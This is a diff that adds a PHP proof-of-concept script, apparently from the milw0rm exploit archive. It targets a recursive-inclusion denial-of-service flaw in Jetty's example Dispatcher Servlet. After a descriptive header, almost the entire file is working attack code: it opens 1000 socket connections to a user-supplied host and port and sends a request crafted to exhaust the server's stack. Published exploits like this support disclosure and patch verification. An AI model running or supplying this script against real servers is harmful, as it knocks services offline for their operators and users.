@@ -1,0 +1,46 @@
+<?php
+####################################################################################
+# Mortbay Jetty <= 7.0.0-pre5 Dispatcher Servlet DoS							  	
+#																					
+# Affected Software: Jetty < 6.1.16, < 7.0.0.pre5 (all platforms)					
+# Author: Ikki (http://blog.nibblesec.org/)											
+#																					
+# Description: 																		
+# The dispatcher servlet (com.acme.DispatchServlet) is prone to a DoS vulnerability.
+# This example servlet is meant to be used as a resources dispatcher, however a 	
+# malicious aggressor may abuse this functionality in order to cause a recursive 	
+# inclusion. In detail, it is possible to abuse the method  						
+# com.acme.DispatchServlet.doGet(DispatchServlet.java:203) forcing the application 	
+# to recursively include the "DispatchServlet". 									
+# As a result, it is possible to trigger a "java.lang.StackOverflowError" and 		
+# consequently an internal server error (500). Multiple requests may easily affect 	
+# the availability of the entire servlet container. 								
+####################################################################################
+
+error_reporting(E_ALL&E_NOTICE);
+echo("\n\n :: Jetty Dispatcher Servlet DoS - http://blog.nibblesec.org  ::\n");
+echo(" :: Affected Software: Jetty < 6.1.16, < 7.0.0.pre5 - all platforms :: \n\n");
+
+if($argc==3){
+	$cont=0;
+	$reqNum=1000;
+	$req = "GET /dispatch/includeN/Dispatch HTTP/1.0\r\n";
+	$req .= "Host: ".$argv[1]."\r\n";
+	$req .= "\r\n";
+	while($cont<$reqNum){
+		$sock = fsockopen($argv[1],$argv[2],$errno,$errstr,30);
+		if(!$sock){
+			echo "\nNo response from ".$argv[1];
+			die;
+		}
+		fwrite($sock,$req);
+		fclose($sock);
+		echo(".");
+		$cont++;
+	}
+	echo ("\n\nCheck your servlet container, after " . $reqNum . " requests:\n" . "http://" . $argv[1] . ":" . $argv[2] . "/");
+}else{
+	echo("\nphp " . $argv[0] . " <host> <port>\n\n");
+}
+
+# milw0rm.com [2009-05-08]
